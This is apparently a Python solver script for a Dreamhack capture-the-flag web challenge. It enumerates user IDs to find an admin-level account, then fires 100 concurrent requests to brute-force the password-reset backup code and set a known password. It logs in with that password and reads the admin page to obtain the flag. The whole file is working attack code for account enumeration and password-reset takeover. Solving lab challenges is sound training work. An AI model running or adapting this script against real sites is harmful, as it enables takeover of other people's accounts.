import requests
import threading

base_url = "http://host1.dreamhack.games:12002"


def get_user_id():
    for user_id in range(25):
        response = requests.get(url=f"{base_url}/user/{user_id}")
        user_level = response.text
        user_level = user_level[user_level.find("UserLevel: ")+len("UserLevel: ")]
        if user_level == '1':
            break

    user_name = response.text
    user_name = user_name[user_name.find("UserID: ")+len("UserID: "):]
    user_name = user_name[:user_name.find("<")]
    return user_name


def change_password(user_id, idx):
    data = {
        "userid": user_id,
        "newpassword": "bindon",
        "backupCode": str(idx)
    }

    requests.post(url=f"{base_url}/forgot_password", data=data)
    

def get_flag(user_id):
    data = {
        "userid": user_id,
        "password": "bindon"
    }

    session = requests.Session()

    session.post(url=f"{base_url}/login", data=data)
    response = session.get(url=f"{base_url}/admin")
    return response.text


def main():
    user_id = get_user_id()
    request_thread = []

    for idx in range(100):
        current_thread = threading.Thread(target=change_password, args=(user_id, idx))
        request_thread.append(current_thread)
        current_thread.start()

    for current_thread in request_thread:
        current_thread.join()

    flag = get_flag(user_id)
    print(f"{flag = }")


if __name__ == "__main__":
    main()
